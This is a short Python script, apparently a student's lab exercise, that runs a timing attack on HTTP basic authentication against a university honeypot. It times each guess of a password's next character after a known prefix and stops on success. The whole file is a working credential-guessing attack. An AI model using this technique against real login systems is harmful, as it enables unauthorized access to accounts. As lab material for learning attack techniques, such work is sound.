import requests
import time
import string

itera = list(string.printable)
for x in range(0, 62):
    sTimer = time.time()
    r = requests.get('http://honeypot2.it.itba.edu.ar/authentication/example2/', auth=('hacker', 'b' + '4' + 'n' + 'f' + '1' + 'e' + 'l' + itera[x]))
    r.content 
    tTotal = time.time() - sTimer
    print('b' + '4' + 'n' + 'f' + '1' + 'e' + 'l' + itera[x])
    print(tTotal)
    if (r.status_code == 200):
        break;


print("Se conecto")
print("Matias Pavan")



